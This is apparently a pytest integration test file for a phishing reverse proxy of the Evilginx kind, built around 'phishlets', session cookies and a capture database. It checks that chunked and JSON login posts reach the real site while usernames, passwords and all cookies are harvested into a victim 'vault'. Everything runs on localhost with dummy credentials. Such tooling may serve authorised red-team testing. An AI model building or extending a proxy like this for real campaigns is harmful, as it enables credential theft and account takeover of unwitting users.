"""Modern login shapes that used to break through the proxy.

Chunked request bodies: a body sent with `Transfer-Encoding: chunked` has no
Content-Length, so the proxy read zero bytes and relayed a login POST with an EMPTY
body while capturing nothing.

JSON logins: credential extraction only understood urlencoded forms, so a SPA that
posts `{"username": ..., "password": ...}` to an API route captured nothing.

Both are verified against a local upstream that records what it really received.
"""
import http.client
import json
import os
import socket
import socketserver
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

pytestmark = pytest.mark.integration


class LoginUpstream(BaseHTTPRequestHandler):
    """Records every body it receives, whatever the framing."""
    protocol_version = "HTTP/1.1"
    received = []

    def log_message(self, *a):
        pass

    def _body(self):
        if "chunked" in (self.headers.get("Transfer-Encoding") or "").lower():
            out = b""
            while True:
                line = self.rfile.readline(64).strip()
                size = int((line.split(b";")[0] or b"0"), 16)
                if size == 0:
                    self.rfile.readline(2)
                    break
                out += self.rfile.read(size)
                self.rfile.read(2)
            return out
        n = int(self.headers.get("Content-Length") or 0)
        return self.rfile.read(n) if n else b""

    def do_GET(self):
        body = b"<html><body><form method=post action=/session>" \
               b"<input name=username><input name=password type=password></form></body></html>"
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        raw = self._body()
        LoginUpstream.received.append({
            "path": self.path, "body": raw,
            "ctype": self.headers.get("Content-Type", ""),
            "framing": self.headers.get("Transfer-Encoding") or
                       f"content-length={self.headers.get('Content-Length')}",
            "cookie": self.headers.get("Cookie", ""),
        })
        resp = b'{"ok": true}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)


class Up(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

    def __init__(self):
        super().__init__(("127.0.0.1", 0), LoginUpstream)
        self.daemon_threads = True


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture()
def proxy():
    import tempfile

    from core import capture as cap
    from core.phishlet import CredentialField, Phishlet, ProxyHost
    from core.proxy import ProxyEngine, serve_proxy
    LoginUpstream.received = []
    up = Up()
    up_port = up.server_address[1]
    threading.Thread(target=up.serve_forever, daemon=True).start()
    db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_mod_"), "m.db"))
    ph = Phishlet(capture_cookies=["*"], inject_paths=[".*"], verify_tls=False,
                  credentials={"username": CredentialField("username", "(.*)", "post"),
                               "password": CredentialField("password", "(.*)", "post")})
    ph.proxy_hosts = [ProxyHost(domain="127.0.0.1", orig_sub="", phish_sub="",
                               scheme="http", port=up_port, is_landing=True)]
    engine = ProxyEngine(ph, db=db, geo_provider="off", logger=lambda *a: None)
    port = free_port()
    httpd = serve_proxy(engine, port, campaign="modern")
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.3)
    yield engine, db, httpd, port
    httpd.shutdown()
    up.shutdown()
    db.close()


def _session_id(port):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    conn.request("GET", "/login", headers={"Host": "127.0.0.1"})
    r = conn.getresponse()
    r.read()
    sid = ""
    for k, v in r.getheaders():
        if k.lower() == "set-cookie" and v.startswith("__bhs="):
            sid = v.split("=")[1].split(";")[0]
    conn.close()
    return sid


def _chunked_post(port, sid, chunks, path="/session", ctype="application/x-www-form-urlencoded"):
    """Send a real chunked request: the body arrives without a Content-Length."""
    sock = socket.create_connection(("127.0.0.1", port), timeout=10)
    head = (f"POST {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Cookie: __bhs={sid}\r\nContent-Type: {ctype}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n")
    sock.sendall(head.encode())
    # An oversized body is refused WITHOUT being drained (that is the fix: a client that
    # announces `ffffffff` and sends nothing used to hold the worker thread forever), so
    # the server may close the connection while we are still sending. That is a refusal,
    # not a test failure - keep whatever the server already wrote.
    try:
        for chunk in chunks:
            sock.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        sock.sendall(b"0\r\n\r\n")
    except (BrokenPipeError, ConnectionResetError):
        pass
    resp = b""
    sock.settimeout(10)
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            resp += data
    except Exception:
        pass
    sock.close()
    return resp


class TestChunkedBodies:

    def test_the_upstream_receives_the_whole_chunked_body(self, proxy):
        engine, db, httpd, port = proxy
        sid = _session_id(port)
        _chunked_post(port, sid,
                      [b"username=victim%40corp.test&", b"password=S3cret!"])
        assert LoginUpstream.received, "the upstream saw no request"
        got = LoginUpstream.received[-1]
        assert got["body"] == b"username=victim%40corp.test&password=S3cret!", got
        assert got["framing"].startswith("content-length"), got      # re-framed
        assert "chunked" not in got["framing"]

    def test_a_chunked_login_is_captured(self, proxy):
        engine, db, httpd, port = proxy
        sid = _session_id(port)
        _chunked_post(port, sid, [b"username=victim%40corp.test&password=S3cret!"])
        sess = engine.sessions[sid]
        assert sess.vault["credentials"]["username"] == "victim@corp.test"
        assert sess.vault["credentials"]["password"] == "S3cret!"

    def test_an_oversized_chunked_body_is_refused(self, proxy):
        engine, db, httpd, port = proxy
        sid = _session_id(port)
        big = b"x" * (3 * 1024 * 1024)
        resp = _chunked_post(port, sid, [big])
        assert b"413" in resp.split(b"\r\n")[0], resp[:200]


class TestJsonLogins:

    def test_a_json_login_is_relayed_and_captured(self, proxy):
        engine, db, httpd, port = proxy
        sid = _session_id(port)
        payload = json.dumps({"username": "victim@corp.test", "password": "S3cret!"}).encode()
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
        conn.request("POST", "/api/session", body=payload,
                     headers={"Host": "127.0.0.1", "Cookie": f"__bhs={sid}",
                              "Content-Type": "application/json"})
        r = conn.getresponse()
        r.read()
        conn.close()
        got = LoginUpstream.received[-1]
        assert got["path"] == "/api/session"
        assert json.loads(got["body"])["password"] == "S3cret!"
        assert got["ctype"].startswith("application/json")
        sess = engine.sessions[sid]
        assert sess.vault["credentials"]["username"] == "victim@corp.test"
        assert sess.vault["credentials"]["password"] == "S3cret!"

    def test_a_nested_json_login_is_captured(self, proxy):
        engine, db, httpd, port = proxy
        sid = _session_id(port)
        payload = json.dumps({"user": {"email": "nested@corp.test", "password": "pw12345"}}).encode()
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
        conn.request("POST", "/graphql", body=payload,
                     headers={"Host": "127.0.0.1", "Cookie": f"__bhs={sid}",
                              "Content-Type": "application/json"})
        r = conn.getresponse()
        r.read()
        conn.close()
        sess = engine.sessions[sid]
        assert sess.vault["credentials"]["email"] == "nested@corp.test"
        assert sess.vault["credentials"]["password"] == "pw12345"

    def test_a_json_body_that_is_not_credentials_is_ignored(self, proxy):
        engine, db, httpd, port = proxy
        sid = _session_id(port)
        payload = json.dumps({"query": "{ viewer { name } }", "variables": {}}).encode()
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
        conn.request("POST", "/graphql", body=payload,
                     headers={"Host": "127.0.0.1", "Cookie": f"__bhs={sid}",
                              "Content-Type": "application/json"})
        r = conn.getresponse()
        r.read()
        conn.close()
        assert not (engine.sessions[sid].vault.get("credentials") or {})
